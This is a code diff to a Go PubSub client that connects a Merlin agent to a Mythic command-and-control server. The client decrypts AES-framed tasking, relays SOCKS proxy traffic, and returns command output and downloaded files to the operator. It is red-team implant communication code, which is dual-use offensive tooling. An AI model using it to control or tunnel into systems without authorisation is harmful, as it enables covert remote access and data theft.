-                      color.Cyan("[*] Starting PubSub listener goroutine")
-              }
+		if core.Verbose {
+			color.Cyan("[*] Starting PubSub message processor goroutine")
+		}
 
-              // Start listening in background for PubSub messages
-              go func() {
-                      err := p.transport.Listen(func(task map[string]interface{}) map[string]interface{} {
-                              if core.Debug {
-                                      color.Yellow(fmt.Sprintf("[DEBUG] Received task: %v", task))
-                              }
+		// Transport listener is already running from Initial().
+		// Start a processor goroutine that decrypts incoming messages and queues them.
+		go func() {
+			for msg := range p.messages {
+				mythicMap, ok := msg.(map[string]interface{})
+				if !ok {
+					if core.Verbose {
+						color.Red(fmt.Sprintf("[-] Invalid message type: %T", msg))
+					}
+					continue
+				}
 
-                              // Queue the message for processing
-                              p.messages <- task
+				// Extract and decrypt the "message" field
+				encodedMsg, ok := mythicMap["message"].(string)
+				if !ok {
+					if core.Verbose {
+						color.Red("[-] Message missing 'message' field")
+					}
+					continue
+				}
 
-                              // Return nil - we'll send responses separately via Send()
-                              return nil
-                      })
+				// Parse Mythic frame
+				_, body, err := parseMythicFrame(encodedMsg)
+				if err != nil {
+					if core.Verbose {
+						color.Red(fmt.Sprintf("[-] Failed to parse Mythic frame: %v", err))
+					}
+					continue
+				}
 
-                      if err != nil {
-                              if core.Verbose {
-                                      color.Red(fmt.Sprintf("[-] Listen error: %v", err))
-                              }
-                      }
-              }()
+				// Decrypt (skip for plaintext mode)
+				var plaintext []byte
+				if p.encryptionMode == "none" {
+					plaintext = body
+				} else if p.psk != nil {
+					plaintext, err = aesDecrypt(p.psk, body)
+					if err != nil {
+						if core.Verbose {
+							color.Red(fmt.Sprintf("[-] Failed to AES-decrypt message: %v", err))
+						}
+						continue
+					}
+				} else {
+					if core.Verbose {
+						color.Red("[-] No encryption key available but encryption mode is not 'none'")
+					}
+					continue
+				}
 
-              // Background processor goroutine - converts Mythic tasks to Merlin format
-              go func() {
-                      for msg := range p.messages {
-                              // Convert Mythic format to Merlin format
-                              mythicMap, ok := msg.(map[string]interface{})
-                              if !ok {
-                                      if core.Verbose {
-                                              color.Red(fmt.Sprintf("[-] Invalid message type: %T", msg))
-                                      }
-                                      continue
-                              }
+				// Parse JSON
+				var taskData map[string]interface{}
+				if err := json.Unmarshal(plaintext, &taskData); err != nil {
+					if core.Verbose {
+						color.Red(fmt.Sprintf("[-] Failed to parse decrypted JSON: %v", err))
+					}
+					continue
+				}
 
-                              // Convert to messages.Base using our conversion function
-                              base := p.convertMythicTasksToMerlin(mythicMap)
+				if core.Debug {
+					color.Yellow(fmt.Sprintf("[DEBUG] Decrypted task data: %v", taskData))
+				}
 
-                              if core.Verbose {
-                                      color.Green(fmt.Sprintf("[+] Received task from PubSub: %v", base))
-                              }
+				// Convert tasks to Merlin messages.Base
+				base := p.convertMythicTasksToMerlin(taskData)
 
-                              // Add to pending jobs queue - run.Run()'s listen() goroutine will call Listen() to retrieve these
-                              p.mu.Lock()
-                              p.pendingJobs = append(p.pendingJobs, base)
-                              p.mu.Unlock()
+				if core.Verbose {
+					color.Green(fmt.Sprintf("[+] Received and decrypted task from PubSub: %v", base))
+				}
 
-                              if core.Debug {
-                                      color.Yellow(fmt.Sprintf("[DEBUG] Added message to pending queue, total: %d", len(p.pendingJobs)))
-                              }
-                      }
-              }()
+				p.mu.Lock()
+				p.pendingJobs = append(p.pendingJobs, base)
+				p.mu.Unlock()
 
-              return []messages.Base{}, nil
-      }
-      p.mu.Unlock()
+				// Process SOCKS data from server response (present in both get_tasking and post_response responses)
+				if socksInterface, ok := taskData["socks"]; ok {
+					if socksArray, ok := socksInterface.([]interface{}); ok && len(socksArray) > 0 {
+						// Convert to typed struct
+						var mythicSocksData []mythicSocks
+						socksJSON, err := json.Marshal(socksArray)
+						if err == nil {
+							if err := json.Unmarshal(socksJSON, &mythicSocksData); err == nil && len(mythicSocksData) > 0 {
+								socksBase, err := p.convertSocksToJobs(mythicSocksData)
+								if err != nil {
+									if core.Verbose {
+										color.Red(fmt.Sprintf("[-] Failed to convert SOCKS data: %v", err))
+									}
+								} else if len(socksBase.Payload.([]jobs.Job)) > 0 {
+									if core.Debug {
+										color.Yellow(fmt.Sprintf("[DEBUG] Received %d SOCKS jobs from server", len(socksBase.Payload.([]jobs.Job))))
+									}
+									p.mu.Lock()
+									p.pendingJobs = append(p.pendingJobs, socksBase)
+									p.mu.Unlock()
+								}
+							}
+						}
+					}
+				}
+			}
+		}()
 
-      // Retrieve pending jobs
-      p.mu.Lock()
-      jobs := make([]messages.Base, len(p.pendingJobs))
-      copy(jobs, p.pendingJobs)
-      p.pendingJobs = p.pendingJobs[:0] // Clear the queue
-      p.mu.Unlock()
+		return []messages.Base{}, nil
+	}
+	p.mu.Unlock()
 
-      if core.Debug && len(jobs) > 0 {
-              color.Yellow(fmt.Sprintf("[DEBUG] Returning %d jobs from pending queue", len(jobs)))
-              for i, job := range jobs {
-                      color.Yellow(fmt.Sprintf("[DEBUG] Job %d: Type=%v, Payload=%v", i, job.Type, job.Payload))
-              }
-      }
+	// Retrieve pending jobs
+	p.mu.Lock()
+	pendingJobs := make([]messages.Base, len(p.pendingJobs))
+	copy(pendingJobs, p.pendingJobs)
+	p.pendingJobs = p.pendingJobs[:0]
+	p.mu.Unlock()
 
-      // If no jobs, sleep briefly to avoid tight loop
-      if len(jobs) == 0 {
-              time.Sleep(100 * time.Millisecond)
-      }
+	if core.Debug && len(pendingJobs) > 0 {
+		color.Yellow(fmt.Sprintf("[DEBUG] Returning %d jobs from pending queue", len(pendingJobs)))
+	}
 
-      return jobs, nil
+	if len(pendingJobs) == 0 {
+		time.Sleep(5 * time.Millisecond)
+	}
+
+	return pendingJobs, nil
 }
 
-
+// Send sends a Merlin message to Mythic, encrypted (or plaintext) and framed.
 func (p *PubSubClient) Send(message messages.Base) ([]messages.Base, error) {
-    if core.Debug {
-        color.Yellow(fmt.Sprintf("[DEBUG] Sending message: %v", message))
-    }
+	if core.Debug {
+		color.Yellow(fmt.Sprintf("[DEBUG] Sending message: %v", message))
+	}
 
-    // Convert Merlin format to Mythic API format
-    mythicMsg := p.convertToMythicFormat(message)
+	// Convert Merlin format to Mythic API format
+	mythicMsg := p.convertToMythicFormat(message)
 
-    // Send via transport
-    err := p.transport.Send(mythicMsg)
-    if err != nil {
-        return nil, fmt.Errorf("failed to send: %w", err)
-    }
+	// Marshal to JSON
+	jsonBody, err := json.Marshal(mythicMsg)
+	if err != nil {
+		return nil, fmt.Errorf("failed to marshal message: %w", err)
+	}
 
-    if core.Verbose {
-        color.Green("[+] Message sent successfully")
-    }
+	// Build Mythic frame based on encryption mode
+	var frame string
+	if p.encryptionMode == "none" {
+		// Plaintext mode
+		frame = buildMythicFrame(p.agentID, jsonBody)
+	} else if p.psk != nil {
+		// Encrypted mode (aes256_hmac or rsa)
+		encrypted, err := aesEncrypt(p.psk, jsonBody)
+		if err != nil {
+			return nil, fmt.Errorf("failed to AES-encrypt message: %w", err)
+		}
+		frame = buildMythicFrame(p.agentID, encrypted)
+	} else {
+		return nil, fmt.Errorf("no encryption key available for mode: %s", p.encryptionMode)
+	}
 
-   return []messages.Base{}, nil
+	// Send via transport
+	if err := p.transport.SendRaw(frame); err != nil {
+		return nil, fmt.Errorf("failed to send: %w", err)
+	}
+
+	if p.encryptionMode == "none" {
+		if core.Verbose {
+			color.Yellow("[+] Plaintext message sent")
+		}
+	} else {
+		if core.Verbose {
+			color.Green("[+] Encrypted message sent successfully")
+		}
+	}
+
+	return []messages.Base{}, nil
 }
 
 // convertToMythicFormat converts Merlin messages.Base to Mythic API format
 func (p *PubSubClient) convertToMythicFormat(msg messages.Base) map[string]interface{} {
-    mythicMsg := make(map[string]interface{})
+	mythicMsg := make(map[string]interface{})
 
-    // Convert message type to Mythic action
-    switch msg.Type {
-    case messages.CHECKIN:
-        // Only send "checkin" action for the very first checkin
-        // After that, convert to "get_tasking" to avoid creating new callbacks
-        if !p.initialCheckinDone {
-            mythicMsg["action"] = "checkin"
-            mythicMsg["uuid"] = p.agentID
+	switch msg.Type {
+	case messages.CHECKIN:
+		// After initial checkin, subsequent checkins become get_tasking requests
+		mythicMsg["action"] = "get_tasking"
+		mythicMsg["tasking_size"] = -1
 
-            // Extract AgentInfo if present
-            if agentInfo, ok := msg.Payload.(messages.AgentInfo); ok {
-                sysInfo := agentInfo.SysInfo
-                mythicMsg["ips"] = sysInfo.Ips
-                mythicMsg["os"] = sysInfo.Platform
-                mythicMsg["user"] = sysInfo.UserName
-                mythicMsg["host"] = sysInfo.HostName
-                mythicMsg["pid"] = sysInfo.Pid
-                mythicMsg["architecture"] = sysInfo.Architecture
-                mythicMsg["domain"] = sysInfo.Domain
-                mythicMsg["integrity_level"] = sysInfo.Integrity
-            }
+	case messages.JOBS:
+		jobsArray, ok := msg.Payload.([]jobs.Job)
+		if !ok || len(jobsArray) == 0 {
+			mythicMsg["action"] = "get_tasking"
+			mythicMsg["tasking_size"] = -1
+			break
+		}
 
-            // Mark initial checkin as done
-            p.initialCheckinDone = true
-        } else {
-            // Subsequent checkins become get_tasking requests
-            mythicMsg["action"] = "get_tasking"
-            mythicMsg["uuid"] = p.agentID
-            mythicMsg["tasking_size"] = -1
-        }
+		// Separate jobs into responses and SOCKS data (mirrors mythic.go Construct)
+		responses := make([]interface{}, 0)
+		socksData := make([]mythicSocks, 0)
 
-    case messages.JOBS:
-        // Check if this is a result message (jobs being returned) or a request for jobs
-        jobsArray, ok := msg.Payload.([]jobs.Job)
-        if ok && len(jobsArray) > 0 {
-            // Check if first job is a RESULT type
-            if jobsArray[0].Type == jobs.RESULT || jobsArray[0].Type == jobs.AGENTINFO || jobsArray[0].Type == jobs.FILETRANSFER {
-                // This is a result being sent back to Mythic
-                mythicMsg["action"] = "post_response"
-                mythicMsg["uuid"] = p.agentID
+		for _, job := range jobsArray {
+			switch job.Type {
+			case jobs.SOCKS:
+				sockMsg := job.Payload.(jobs.Socks)
 
-                // Build responses array
-                responses := make([]interface{}, 0, len(jobsArray))
-                for _, job := range jobsArray {
-                    response := map[string]interface{}{
-                        "task_id": job.ID,
-                    }
+				// Drop the spoofed SOCKS handshake response (0x05, 0x00) — Mythic doesn't need it
+				if bytes.Equal(sockMsg.Data, []byte{0x05, 0x00}) {
+					break
+				}
 
-                    // Handle different result types
-                    switch job.Type {
-                    case jobs.RESULT:
-                        result := job.Payload.(jobs.Results)
-                        if result.Stdout != "" {
-                            response["user_output"] = result.Stdout
-                        }
-                        if result.Stderr != "" {
-                            response["user_output"] = result.Stderr
-                        }
-                        response["completed"] = true
-                        response["status"] = "success"
-                    case jobs.AGENTINFO:
-                        // Convert AgentInfo to JSON
-                        infoBytes, _ := json.Marshal(job.Payload)
-                        response["user_output"] = string(infoBytes)
-                        response["completed"] = true
-                        response["status"] = "success"
-                    case jobs.FILETRANSFER:
-                        // Handle file transfer results
-                        ft := job.Payload.(jobs.FileTransfer)
-                        if ft.IsDownload {
-                            response["user_output"] = fmt.Sprintf("File uploaded: %s", ft.FileLocation)
-                        } else {
-                            response["user_output"] = fmt.Sprintf("File downloaded: %s", ft.FileLocation)
-                            response["download"] = map[string]interface{}{
-                                "path": ft.FileLocation,
-                                "data": ft.FileBlob,
-                            }
-                        }
-                        response["completed"] = true
-                        response["status"] = "success"
-                    }
+				sock := mythicSocks{
+					Exit: sockMsg.Close,
+				}
 
-                    responses = append(responses, response)
-                }
+				// Translate Merlin UUID → Mythic server_id
+				id, ok := mythicSocksConnection.Load(sockMsg.ID)
+				if !ok {
+					if core.Verbose {
+						color.Red(fmt.Sprintf("[-] SOCKS connection ID %s not found in mapping", sockMsg.ID))
+					}
+					break
+				}
+				sock.ServerId = id.(int32)
 
-                mythicMsg["responses"] = responses
-            } else {
-                // Empty jobs message or requesting more tasks
-                mythicMsg["action"] = "get_tasking"
-                mythicMsg["uuid"] = p.agentID
-                mythicMsg["tasking_size"] = -1
-            }
-        } else {
-            // Empty jobs array - request more tasks
-            mythicMsg["action"] = "get_tasking"
-            mythicMsg["uuid"] = p.agentID
-            mythicMsg["tasking_size"] = -1
-        }
+				// Base64 encode the data for Mythic
+				sock.Data = base64.StdEncoding.EncodeToString(sockMsg.Data)
+				socksData = append(socksData, sock)
 
-    default:
-        // For other message types, just pass through as JSON
-        mythicMsg["action"] = "post_response"
-        mythicMsg["uuid"] = p.agentID
-        mythicMsg["responses"] = []interface{}{msg}
-    }
+				// Clean up mappings on connection close
+				if sockMsg.Close {
+					socksConnection.Delete(id)
+					mythicSocksConnection.Delete(sockMsg.ID)
+				}
 
-    return mythicMsg
+			case jobs.RESULT:
+				result := job.Payload.(jobs.Results)
+				response := map[string]interface{}{
+					"task_id":   job.ID,
+					"completed": true,
+					"status":    "success",
+				}
+				if result.Stdout != "" {
+					response["user_output"] = result.Stdout
+				}
+				if result.Stderr != "" {
+					response["user_output"] = result.Stderr
+				}
+				responses = append(responses, response)
+
+			case jobs.AGENTINFO:
+				infoBytes, _ := json.Marshal(job.Payload)
+				response := map[string]interface{}{
+					"task_id":     job.ID,
+					"user_output": string(infoBytes),
+					"completed":   true,
+					"status":      "success",
+				}
+				responses = append(responses, response)
+
+			case jobs.FILETRANSFER:
+				ft := job.Payload.(jobs.FileTransfer)
+				response := map[string]interface{}{
+					"task_id":   job.ID,
+					"completed": true,
+					"status":    "success",
+				}
+				if ft.IsDownload {
+					response["user_output"] = fmt.Sprintf("File uploaded: %s", ft.FileLocation)
+				} else {
+					response["user_output"] = fmt.Sprintf("File downloaded: %s", ft.FileLocation)
+					response["download"] = map[string]interface{}{
+						"path": ft.FileLocation,
+						"data": ft.FileBlob,
+					}
+				}
+				responses = append(responses, response)
+			}
+		}
+
+		// Build the appropriate message type
+		if len(responses) > 0 || len(socksData) > 0 {
+			mythicMsg["action"] = "post_response"
+			mythicMsg["responses"] = responses
+			if len(socksData) > 0 {
+				mythicMsg["socks"] = socksData
+			}
+		} else {
+			// All SOCKS jobs were dropped (e.g., spoofed handshake) — send get_tasking instead
+			mythicMsg["action"] = "get_tasking"
+			mythicMsg["tasking_size"] = -1
+		}
+
+	default:
+		mythicMsg["action"] = "post_response"
+		mythicMsg["responses"] = []interface{}{msg}
+	}
+
+	return mythicMsg
 }
 
-
-
 // Synchronous returns whether this is a synchronous client
-// For PubSub integration with run.Run(), we return true so that the listen() goroutine
-// is started, which regularly calls Listen() to retrieve and process queued jobs
 func (p *PubSubClient) Synchronous() bool {
 	return true
 }
